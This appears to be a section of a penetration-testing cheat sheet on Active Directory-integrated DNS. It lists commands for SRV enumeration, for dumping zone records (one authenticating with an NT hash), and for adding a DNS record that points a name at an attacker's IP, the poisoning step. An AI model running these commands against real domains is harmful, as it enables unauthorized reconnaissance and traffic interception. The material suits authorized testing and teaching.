\section{Active Directory Integrated DNS}

\begin{verbatim}
dig -t _gc._tcp.<domain_fqdn>
dig -t _ldap._tcp.<domain_fqdn>
dig -t _kerberos._tcp.<domain_fqdn>
dig -t _kpasswd._tcp.<domain_fqdn>

nslookup -type=srv _kerberos._tcp.<domain_fqdn>
nslookup -type=srv _kerberos._tcp.<domain_fqdn>

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='<domain_fqdn>'"
\end{verbatim}



\subsection{Enumerating DNS Records}
By default, all users can list the child objects of a DNS zone in an AD
environment. By default, querying DNS records using LDAP does not return all
results. So by using the
\href{https://github.com/dirkjanm/adidnsdump}{adidnsdump tool}, it is possible
to resolve all records in the zone and potentially find something useful. The
background and more in-depth explanation of this tool and technique can be
found in this
\href{https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/}{post}.

\begin{verbatim}
adidnsdump -u DOMAIN\\SAMAN -p <password> ldap://IP -r
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain_fqdn>  
\end{verbatim}



\subsection{Create a new DNS record}

\href{https://github.com/dirkjanm/krbrelayx}{dnstool.py} allow to
add/modify/delete Active Directory Integrated DNS records via LDAP.

\begin{verbatim}
$ python dnstool.py \
    -u foo.lan\\ownedUser -p userPassword \
    -r PWNED.foo.lan -a add -d <attacker-IP> \
    DC1.foo.lan


bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
\end{verbatim}

\subsection{links}

\begin{itemize}
    \item \href{https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/}{Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS}
    \item \href{https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing}{ADIDNS poisoning}
    \item \href{https://blog.scrt.ch/2023/09/25/exploiting-stale-adidns-entries/}{Exploiting stale ADIDNS entries}
    \item \href{https://www.netspi.com/blog/technical-blog/network-penetration-testing/adidns-revisited/}{ADIDNS Revisited – WPAD, GQBL, and More}
\end{itemize}